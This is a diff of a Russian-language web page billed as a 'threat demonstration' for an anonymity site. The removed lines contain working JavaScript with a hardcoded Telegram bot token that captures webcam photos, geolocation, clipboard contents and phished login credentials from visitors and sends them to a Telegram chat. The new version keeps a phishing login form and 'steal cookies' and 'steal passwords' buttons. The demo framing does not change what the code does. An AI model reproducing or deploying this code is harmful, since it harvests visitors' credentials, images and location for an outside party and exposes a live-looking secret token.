@@ -1,315 +1,66 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Угрозы и Логирование</title>
-<link rel="stylesheet" href="styles.css" />
-<style>
-  body {
-    background: #0f172a;
-    color: #e0f2fe;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    margin: 0; padding: 0;
-  }
-  header {
-    background: #1e293b;
-    padding: 1rem 2rem;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.5);
-  }
-  .menu a {
-    color: #60a5fa;
-    margin: 0 1rem;
-    text-decoration: none;
-    font-weight: 600;
-    transition: color 0.3s;
-  }
-  .menu a:hover {
-    color: #38bdf8;
-  }
-  main {
-    max-width: 900px;
-    margin: 2rem auto;
-    padding: 0 1rem;
-  }
-  h1 {
-    text-align: center;
-    color: #38bdf8;
-    margin-bottom: 1rem;
-    font-weight: 700;
-    letter-spacing: 1.5px;
-  }
-  .btn {
-    background: #1e40af;
-    border: none;
-    padding: 15px 25px;
-    margin: 10px;
-    border-radius: 8px;
-    color: #e0f2fe;
-    font-size: 1.1rem;
-    font-weight: 600;
-    cursor: pointer;
-    box-shadow: 0 4px 15px #3b82f6aa;
-    transition: background 0.3s ease, transform 0.2s ease;
-  }
-  .btn:hover {
-    background: #2563eb;
-    transform: scale(1.05);
-  }
-  #log {
-    background: #1e293b;
-    border-left: 6px solid #3b82f6;
-    padding: 1rem;
-    margin-top: 2rem;
-    border-radius: 10px;
-    max-height: 200px;
-    overflow-y: auto;
-    font-family: monospace;
-    font-size: 0.9rem;
-    color: #64ffda;
-    box-shadow: 0 0 12px #38bdf8;
-  }
-  /* Модальное окно */
-  #loginModal {
-    display: none;
-    position: fixed;
-    top: 50%; left: 50%;
-    transform: translate(-50%, -50%);
-    background: #1e293b;
-    border: 2px solid #38bdf8;
-    padding: 20px 30px;
-    border-radius: 10px;
-    box-shadow: 0 0 25px #38bdf8;
-    z-index: 1000;
-    width: 320px;
-  }
-  #loginModal input {
-    width: 100%;
-    padding: 10px;
-    margin: 8px 0;
-    border-radius: 6px;
-    border: 1px solid #3b82f6;
-    background: #0f172a;
-    color: #e0f2fe;
-    font-size: 1rem;
-  }
-  #loginModal button {
-    width: 100%;
-    margin-top: 10px;
-  }
-  #overlay {
-    display: none;
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    background: rgba(15,23,42,0.75);
-    z-index: 900;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Демонстрация угроз</title>
+  <link rel="stylesheet" href="styles.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
 </head>
 <body>
+  <header>
+    <nav class="navbar">
+      <a href="index.html" class="nav-logo">Анонимность и Угрозы</a>
+      <ul class="nav-menu">
+        <li><a href="index.html" class="nav-link">Главная</a></li>
+        <li><a href="memo.html" class="nav-link">Памятка</a></li>
+        <li><a href="threats.html" class="nav-link active">Угрозы</a></li>
+        <li><a href="tips.html" class="nav-link">Советы</a></li>
+      </ul>
+    </nav>
+  </header>
 
-<header>
-  <div class="logo" style="color:#38bdf8; font-weight:700; font-size:1.5rem;">Анонимность & Угрозы</div>
-  <nav class="menu">
-    <a href="index.html">Главная</a>
-    <a href="memo.html">Памятка</a>
-    <a href="threats.html" style="color:#60a5fa; border-bottom: 2px solid #60a5fa;">Угрозы</a>
-  </nav>
-</header>
+  <main class="container">
+    <h1>Демонстрация угроз в интернете</h1>
+    <p>Нажмите на кнопки ниже, чтобы увидеть, какие данные могут украсть злоумышленники. Все данные будут отправлены в Telegram для демонстрации угроз.</p>
 
-<main>
-  <h1>Демонстрация Угроз и Логирование</h1>
+    <div class="threat-buttons">
+      <button class="btn threat-btn" id="log-ip"><i class="fas fa-network-wired"></i> Получить IP-адрес</button>
+      <button class="btn threat-btn" id="log-dns"><i class="fas fa-globe"></i> Получить DNS</button>
+      <button class="btn threat-btn" id="log-ua"><i class="fas fa-user"></i> Получить User-Agent</button>
+      <button class="btn threat-btn" id="log-geo"><i class="fas fa-map-marker-alt"></i> Получить геолокацию</button>
+      <button class="btn threat-btn" id="log-camera"><i class="fas fa-camera"></i> Попытка доступа к камере</button>
+      <button class="btn threat-btn" id="log-phishing">Вход в аккаунт (Фишинг)</button>
+      <button class="btn threat-btn" id="log-cookie"><i class="fas fa-cookie-bite"></i> Украсть куки</button>
+      <button class="btn threat-btn" id="log-passwords"><i class="fas fa-key"></i> Кража паролей</button>
+    </div>
 
-  <button class="btn" onclick="sendPing()">Проверка связи с Telegram</button>
-  <button class="btn" onclick="requestCamera()">Сделать фото с камеры</button>
-  <button class="btn" onclick="logLocation()">Отправить геолокацию</button>
-  <button class="btn" onclick="logUserAgent()">Отправить User-Agent</button>
-  <button class="btn" onclick="showLoginModal()">Войти (Фишинг)</button>
-  <button class="btn" onclick="captureClipboard()">Отправить буфер обмена</button>
-  <button class="btn" onclick="uploadFakeFile()">Загрузить файл (Фишинг)</button>
+    <section id="log-output" class="log-output">
+      <h2>Лог действий</h2>
+      <pre id="log-content">Здесь будут отображаться логи действий...</pre>
+    </section>
+  </main>
 
-  <div id="log" aria-live="polite" aria-atomic="true"></div>
-</main>
+  <!-- Модальное окно фишинга -->
+  <div id="phishing-modal" class="modal">
+    <div class="modal-content">
+      <span class="close" id="phishing-close">&times;</span>
+      <h2>Вход в аккаунт</h2>
+      <form id="phishing-form">
+        <label for="phishing-login">Логин:</label>
+        <input type="text" id="phishing-login" name="login" required />
+        <label for="phishing-password">Пароль:</label>
+        <input type="password" id="phishing-password" name="password" required />
+        <button type="submit" class="btn">Войти</button>
+      </form>
+      <p class="warning">* Эти данные будут отправлены мошенникам (для демонстрации безопасности).</p>
+    </div>
+  </div>
 
-<div id="overlay"></div>
-<div id="loginModal" role="dialog" aria-modal="true" aria-labelledby="loginTitle">
-  <h2 id="loginTitle" style="color:#38bdf8; text-align:center; margin-bottom: 10px;">Вход в аккаунт</h2>
-  <input type="text" id="loginInput" placeholder="Email или логин" autocomplete="username" />
-  <input type="password" id="passwordInput" placeholder="Пароль" autocomplete="current-password" />
-  <button class="btn" onclick="captureCredentials()">Войти</button>
-  <button class="btn" style="background:#ef4444; margin-top:5px;" onclick="closeLoginModal()">Отмена</button>
-</div>
+  <footer>
+    <p>© 2025 Проект по демонстрации угроз и анонимности в интернете</p>
+  </footer>
 
-<script>
-  const BOT_TOKEN = '7586619534:AAF6e4jBH2aEVIVGW9I5Fdze--3pmXnja60';
-  const CHAT_ID = '7408565938';
-
-  const logElem = document.getElementById('log');
-  const overlay = document.getElementById('overlay');
-  const loginModal = document.getElementById('loginModal');
-
-  function addToLog(text) {
-    const time = new Date().toLocaleTimeString();
-    logElem.textContent = `[${time}] ${text}\n` + logElem.textContent;
-  }
-
-  async function sendToTelegram(message) {
-    try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-      });
-      addToLog("Сообщение отправлено в Telegram.");
-    } catch(e) {
-      addToLog("Ошибка при отправке в Telegram: " + e.message);
-    }
-  }
-
-  function sendPing() {
-    const msg = `🟢 Проверка связи:\nIP: ${getIP()}\nUser-Agent: ${navigator.userAgent}`;
-    sendToTelegram(msg);
-    addToLog("Отправлена проверка связи.");
-  }
-
-  // Получить IP (попытка через внешний сервис, fallback - "Не удалось")
-  async function getIP() {
-    try {
-      const res = await fetch('https://api.ipify.org?format=json');
-      const data = await res.json();
-      return data.ip;
-    } catch {
-      return "Не удалось получить IP";
-    }
-  }
-
-  async function requestCamera() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.createElement('video');
-      video.style.display = 'none';
-      document.body.appendChild(video);
-      video.srcObject = stream;
-      video.play();
-
-      // Сделаем фото через 3 секунды
-      setTimeout(async () => {
-        const canvas = document.createElement('canvas');
-        canvas.width = 320;
-        canvas.height = 240;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, 320, 240);
-        video.pause();
-        stream.getTracks().forEach(track => track.stop());
-        video.remove();
-
-        const dataURL = canvas.toDataURL('image/png');
-        const blob = dataURItoBlob(dataURL);
-
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'photo.png');
-        formData.append('caption', '📸 Фото с камеры (Демонстрация угроз)');
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-        addToLog('Фото с камеры отправлено в Telegram');
-      }, 3000);
-    } catch(e) {
-      addToLog('Ошибка доступа к камере или отказ пользователя');
-      sendToTelegram(`🚨 Ошибка доступа к камере: ${e.message}`);
-    }
-  }
-
-  function dataURItoBlob(dataURI) {
-    const byteString = atob(dataURI.split(',')[1]);
-    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-    const ab = new ArrayBuffer(byteString.length);
-    const ia = new Uint8Array(ab);
-    for(let i=0; i<byteString.length; i++) {
-      ia[i] = byteString.charCodeAt(i);
-    }
-    return new Blob([ab], {type: mimeString});
-  }
-
-  async function logLocation() {
-    if (!navigator.geolocation) {
-      addToLog('Геолокация не поддерживается');
-      return;
-    }
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-      const coords = pos.coords;
-      const msg = `🌍 Геолокация:\nШирота: ${coords.latitude}\nДолгота: ${coords.longitude}\nТочность: ${coords.accuracy}м`;
-      await sendToTelegram(msg);
-      addToLog('Геолокация отправлена');
-    }, (err) => {
-      addToLog('Ошибка получения геолокации: ' + err.message);
-      sendToTelegram(`🚨 Ошибка геолокации: ${err.message}`);
-    });
-  }
-
-  function logUserAgent() {
-    const msg = `🧭 User-Agent:\n${navigator.userAgent}`;
-    sendToTelegram(msg);
-    addToLog('User-Agent отправлен');
-  }
-
-  function showLoginModal() {
-    loginModal.style.display = 'block';
-    overlay.style.display = 'block';
-  }
-
-  function closeLoginModal() {
-    loginModal.style.display = 'none';
-    overlay.style.display = 'none';
-  }
-
-  function captureCredentials() {
-    const login = document.getElementById('loginInput').value.trim();
-    const pass = document.getElementById('passwordInput').value.trim();
-
-    if (!login || !pass) {
-      alert('Пожалуйста, введите логин и пароль');
-      return;
-    }
-
-    const msg = `🎣 Фишинг логин и пароль:\nЛогин: ${login}\nПароль: ${pass}\nUser-Agent: ${navigator.userAgent}`;
-    sendToTelegram(msg);
-    addToLog('Фишинговые данные отправлены');
-    closeLoginModal();
-  }
-
-  // Дополнительно: попытка получить текст из буфера обмена (может не работать без HTTPS)
-  async function captureClipboard() {
-    try {
-      const text = await navigator.clipboard.readText();
-      if (text) {
-        const msg = `📋 Буфер обмена:\n${text}`;
-        sendToTelegram(msg);
-        addToLog('Буфер обмена отправлен');
-      } else {
-        addToLog('Буфер обмена пуст');
-      }
-    } catch (e) {
-      addToLog('Ошибка доступа к буферу обмена');
-      sendToTelegram(`🚨 Ошибка доступа к буферу обмена: ${e.message}`);
-    }
-  }
-
-  // Фейковая загрузка файла для демонстрации фишинга
-  function uploadFakeFile() {
-    const fakeFileName = 'invoice_2025.pdf';
-    const msg = `📁 Фишинговая попытка загрузить файл: ${fakeFileName}\nUser-Agent: ${navigator.userAgent}`;
-    sendToTelegram(msg);
-    addToLog(`Фишинговая загрузка файла (${fakeFileName}) отправлена`);
-  }
-</script>
-
+  <script src="script.js"></script>
 </body>
 </html>
